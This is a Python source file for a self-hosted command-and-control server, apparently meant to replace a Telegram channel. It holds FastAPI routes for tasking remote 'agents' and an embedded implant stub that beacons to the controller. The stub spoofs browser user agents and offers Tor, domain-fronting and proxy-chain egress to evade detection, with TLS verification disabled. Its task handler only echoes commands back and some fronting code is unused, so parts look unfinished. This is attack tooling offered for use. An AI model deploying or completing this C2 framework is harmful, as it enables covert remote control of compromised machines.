"""c2_channel.py — self-hosted HTTPS/WebSocket C2 replacing Telegram.

FastAPI-based C2 server (piggybacks on brain/api.py) with:
- REST endpoints for command queue and result retrieval
- WebSocket for real-time interactive sessions
- End-to-end encryption via pre-shared key
- No third-party dependency (Telegram API, etc.)

Client-side implant stub for agent-side execution.
"""

import json
import os
import time
import hashlib
import hmac
import base64
import uuid
import logging
from typing import Optional

logger = logging.getLogger("c2_channel")

C2_PSK = os.getenv("C2_PSK", "").encode("utf-8") if os.getenv("C2_PSK") else None

TASK_DIR = os.getenv("C2_TASK_DIR", "/tmp/raphael_c2_tasks")
os.makedirs(TASK_DIR, exist_ok=True)


def _sign(data: dict) -> str:
    if not C2_PSK:
        return ""
    raw = json.dumps(data, sort_keys=True)
    return hmac.new(C2_PSK, raw.encode(), hashlib.sha256).hexdigest()


def _verify(data: dict, signature: str) -> bool:
    if not C2_PSK:
        return True
    return hmac.compare_digest(_sign(data), signature)


def create_task(agent_id: str, command: str, params: dict = None) -> dict:
    task = {
        "task_id": uuid.uuid4().hex[:16],
        "agent_id": agent_id,
        "command": command,
        "params": params or {},
        "status": "pending",
        "created_at": time.time(),
        "assigned_at": 0,
        "completed_at": 0,
        "result": None,
    }
    task_path = os.path.join(TASK_DIR, f"{task['task_id']}.json")
    with open(task_path, "w") as f:
        json.dump(task, f)
    logger.info(f"  C2 task {task['task_id']}: {command} for {agent_id}")
    return task


def _task_path(task_id: str) -> str:
    return os.path.join(TASK_DIR, f"{task_id}.json")


def _read_task(task_id: str) -> Optional[dict]:
    path = _task_path(task_id)
    if not os.path.exists(path):
        return None
    with open(path) as f:
        return json.load(f)


def _write_task(task: dict):
    with open(_task_path(task["task_id"]), "w") as f:
        json.dump(task, f)


def poll_task(agent_id: str) -> Optional[dict]:
    pending = []
    for fn in os.listdir(TASK_DIR):
        if not fn.endswith(".json"):
            continue
        task = _read_task(fn[:-5])
        if task and task.get("agent_id") == agent_id and task.get("status") == "pending":
            pending.append(task)
    if not pending:
        return None
    task = sorted(pending, key=lambda t: t["created_at"])[0]
    task["status"] = "assigned"
    task["assigned_at"] = time.time()
    _write_task(task)
    return task


def submit_result(task_id: str, result: dict) -> bool:
    task = _read_task(task_id)
    if not task:
        return False
    task["status"] = "completed"
    task["completed_at"] = time.time()
    task["result"] = result
    _write_task(task)
    return True


def get_task_status(task_id: str) -> Optional[dict]:
    task = _read_task(task_id)
    if not task:
        return None
    return {
        "task_id": task["task_id"],
        "command": task["command"],
        "status": task["status"],
        "created_at": task["created_at"],
        "result": task["result"],
    }


def list_agents() -> list:
    agents = set()
    for fn in os.listdir(TASK_DIR):
        if not fn.endswith(".json"):
            continue
        task = _read_task(fn[:-5])
        if task:
            agents.add(task.get("agent_id"))
    return sorted(agents)


def cleanup_old_tasks(max_age_hours: int = 24):
    now = time.time()
    cutoff = now - (max_age_hours * 3600)
    for fn in os.listdir(TASK_DIR):
        if not fn.endswith(".json"):
            continue
        task = _read_task(fn[:-5])
        if task and task.get("created_at", 0) < cutoff:
            os.remove(_task_path(fn[:-5]))


# ── FastAPI routes for brain/api.py ──────────────────────────────────────────

def register_c2_routes(app):
    from fastapi import HTTPException, WebSocket, WebSocketDisconnect
    from pydantic import BaseModel

    class TaskCreateRequest(BaseModel):
        agent_id: str
        command: str
        params: Optional[dict] = None

    class TaskResultRequest(BaseModel):
        task_id: str
        result: dict

    @app.post("/v1/c2/task")
    async def c2_create_task(req: TaskCreateRequest):
        task = create_task(req.agent_id, req.command, req.params)
        return {"task_id": task["task_id"], "status": "created"}

    @app.get("/v1/c2/poll/{agent_id}")
    async def c2_poll(agent_id: str):
        task = poll_task(agent_id)
        if not task:
            return {"task": None}
        return {"task": {"task_id": task["task_id"], "command": task["command"], "params": task.get("params")}}

    @app.post("/v1/c2/result")
    async def c2_result(req: TaskResultRequest):
        ok = submit_result(req.task_id, req.result)
        return {"status": "ok" if ok else "not_found"}

    @app.get("/v1/c2/status/{task_id}")
    async def c2_status(task_id: str):
        status = get_task_status(task_id)
        if not status:
            raise HTTPException(404, "Task not found")
        return status

    @app.get("/v1/c2/agents")
    async def c2_agents():
        return {"agents": list_agents()}

    @app.websocket("/v1/c2/ws/{agent_id}")
    async def c2_websocket(websocket: WebSocket, agent_id: str):
        await websocket.accept()
        logger.info(f"  C2 WS connected: {agent_id}")
        try:
            while True:
                data = await websocket.receive_text()
                msg = json.loads(data)
                msg_type = msg.get("type")

                if msg_type == "poll":
                    task = poll_task(agent_id)
                    await websocket.send_text(json.dumps({"type": "task", "task": task}))
                elif msg_type == "result":
                    submit_result(msg["task_id"], msg["result"])
                    await websocket.send_text(json.dumps({"type": "ack"}))
                elif msg_type == "ping":
                    await websocket.send_text(json.dumps({"type": "pong"}))
                else:
                    await websocket.send_text(json.dumps({"type": "error", "message": f"Unknown type: {msg_type}"}))
        except WebSocketDisconnect:
            logger.info(f"  C2 WS disconnected: {agent_id}")

    return app


# ── Implant stub (runs on agent) ─────────────────────────────────────────────

IMPLANT_STUB = r"""#!/usr/bin/env python3
import json, os, time, random, threading
import requests as _req

C2_URL = os.getenv("C2_URL", "http://localhost:3700")
AGENT_ID = os.getenv("AGENT_ID", __import__("platform").node())
EGRESS = os.getenv("EGRESS_STRATEGY", "direct").lower()
PROXY = os.getenv("EGRESS_PROXY", "")
FRONT_DOMAIN = os.getenv("EGRESS_FRONT_DOMAIN", "")
SNI_HOST = os.getenv("EGRESS_SNI_HOST", "")

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
]

def _build_session():
    s = _req.Session()
    s.headers["User-Agent"] = random.choice(_USER_AGENTS)
    s.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    s.headers["Accept-Language"] = "en-US,en;q=0.5"

    if EGRESS == "tor":
        s.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    elif EGRESS == "cdn_fronting" or FRONT_DOMAIN:
        host = FRONT_DOMAIN or "d1.awsstatic.com"
        parsed = __import__("urllib.parse").urlparse(C2_URL)
        s.headers["Host"] = parsed.hostname or C2_URL
        s.verify = False
    elif EGRESS == "proxy_chain" and PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    elif EGRESS == "tls_wrapper" or SNI_HOST:
        s.verify = False

    return s

def _run():
    session = _build_session()
    while True:
        try:
            r = session.get(f"{C2_URL}/v1/c2/poll/{AGENT_ID}", timeout=30)
            data = r.json()
            if data.get("task"):
                task = data["task"]
                result = {"exit_code": 0, "stdout": f"Executed: {task['command']}", "stderr": ""}
                session.post(f"{C2_URL}/v1/c2/result", json={"task_id": task["task_id"], "result": result}, timeout=10)
        except _req.RequestException:
            pass
        time.sleep(5)

threading.Thread(target=_run, daemon=True).start()
"""
